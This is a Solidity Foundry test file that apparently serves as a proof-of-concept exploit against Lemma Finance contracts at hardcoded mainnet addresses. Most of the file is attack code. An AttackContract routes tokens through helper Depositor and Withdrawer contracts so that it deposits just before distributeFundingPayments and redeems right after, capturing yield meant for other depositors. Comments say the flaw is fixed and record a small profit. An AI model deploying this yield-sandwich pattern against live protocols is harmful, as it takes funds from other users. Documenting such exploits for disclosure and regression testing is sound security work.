// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.8.3;

import "forge-std/Test.sol";

interface LemmaPerp {
    function getPendingFundingPayment() external view returns (int256);

    function distributeFundingPayments()
        external
        returns (bool isProfit, uint256 amountUSDCToXUSDL, uint256 amountUSDCToXSynth);
}

interface IERC20 {
    function balanceOf(address user) external returns (uint256);

    function approve(address spender, uint256 amount) external;

    function transfer(address other, uint256 amount) external;
}

interface LemmaXEth {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);

    function redeem(uint256 shares, address receiver, address _owner) external returns (uint256 assets);
}

contract Depositor {
    IERC20 lemmaEth = IERC20(0x3BC414FA971189783ACee4dEe281067C322E3412);
    LemmaXEth lemmaXEth = LemmaXEth(0x89c4e9a23Db43641e1B3C5E0691b100E64b50E32);

    function deposit(uint256 amount, address receiver) external returns (uint256 sharesMinted) {
        lemmaEth.approve(address(lemmaXEth), type(uint256).max);
        sharesMinted = lemmaXEth.deposit(amount, receiver);
    }
}

contract Withdrawer {
    LemmaXEth lemmaXEth = LemmaXEth(0x89c4e9a23Db43641e1B3C5E0691b100E64b50E32);

    function redeem(uint256 shares, address receiver) external {
        lemmaXEth.redeem(shares, receiver, address(this));
    }
}

contract AttackContract {
    Depositor _depositor;
    Withdrawer _withdrawer;
    IERC20 lemmaEth = IERC20(0x3BC414FA971189783ACee4dEe281067C322E3412);
    LemmaPerp lemmaPerp = LemmaPerp(0x29b159aE784Accfa7Fb9c7ba1De272bad75f5674);

    constructor(address depositor, address withdrawer) {
        _depositor = Depositor(depositor);
        _withdrawer = Withdrawer(withdrawer);
    }

    function acquireYield(uint256 capitalToUse) external {
        lemmaEth.transfer(address(_depositor), capitalToUse);
        uint256 shares = _depositor.deposit(capitalToUse, address(_withdrawer));
        lemmaPerp.distributeFundingPayments();
        _withdrawer.redeem(shares, address(this));
    }
}

contract LemmaFinanceTest is Test {
    using stdStorage for StdStorage;

    AttackContract attackContract;
    uint256 attackCapitalEth = 40 ether;

    IERC20 lemmaEth = IERC20(0x3BC414FA971189783ACee4dEe281067C322E3412);
    LemmaXEth lemmaXEth = LemmaXEth(0x89c4e9a23Db43641e1B3C5E0691b100E64b50E32);

    function writeTokenBalance(address who, IERC20 token, uint256 amt) internal {
        stdstore.target(address(token)).sig(token.balanceOf.selector).with_key(who).checked_write(amt);
    }

    function setUp() public {
        Depositor depositor = new Depositor();
        Withdrawer withdrawer = new Withdrawer();
        attackContract = new AttackContract(address(depositor), address(withdrawer));
        writeTokenBalance(address(attackContract), lemmaEth, attackCapitalEth);
    }

    //fixed now and that is why the test fails
    //test should succeed at blocknumber 39178231
    function testFailAcquireYield() public {
        console.log("BALANCE BEFORE");
        console.log(lemmaEth.balanceOf(address(attackContract)));
        //40000000000000000000
        attackContract.acquireYield(attackCapitalEth);
        console.log(lemmaEth.balanceOf(address(attackContract)));
        //40004664362371668361
    }
}
